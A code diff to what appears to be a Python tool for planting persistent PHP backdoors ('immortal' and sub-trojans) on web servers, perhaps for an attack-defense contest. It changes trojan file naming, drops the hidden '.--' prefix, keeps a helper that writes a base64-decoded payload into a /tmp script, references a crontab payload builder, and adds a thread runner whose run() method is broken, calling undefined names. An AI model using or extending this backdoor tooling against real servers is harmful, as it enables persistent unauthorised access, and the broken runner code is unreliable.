@@ -36,10 +36,10 @@ class BackdoorDescriptions:
             md5_2=hashlib.md5(md5_1.encode("utf-8")).hexdigest()
             
             subTroj_key=md5_1
-            immortalTroj_Name=md5_1[:24]
+            immortalTroj_Name=md5_1[:5]
             subTroj_Name=md5_2[:-5]
-            immortalTroj_Name=f'{path}.--{immortalTroj_Name}.{config.fileType}'
-            subTroj_Name=f'{path}.--{subTroj_Name}.php'
+            immortalTroj_Name=f'{path}{immortalTroj_Name}.{config.fileType}'
+            subTroj_Name=f'{path}{subTroj_Name}.php'
             
             #生成内容
             subTrojContent=config.backdoor_tpl.format(subTroj_key[:5],md5_2)
@@ -63,8 +63,18 @@ def buildCrontab(interval,url,payload,httpType=0):
 def buildCmd(rawCmd):
     raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
     md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
-    return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d  | /bin/cat > /tmp/.--{md5Str}.sh',md5Str
-
+    return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d  | /bin/cat > /tmp/{md5Str}.sh',md5Str
+class Runner(threading.Thread):
+    def __init__(self,function,args,constantRun=False):
+        super(Runner,self).__init__()
+        self.function=function
+        self.args=args
+        self.constantRun=constantRun
+    def run(self):
+        while True:
+            self.Result=function(args)
+            if not self.constantRun:
+                return
 #使用备份的镜像重新部署服务器
 class reDeployServer():
     pass
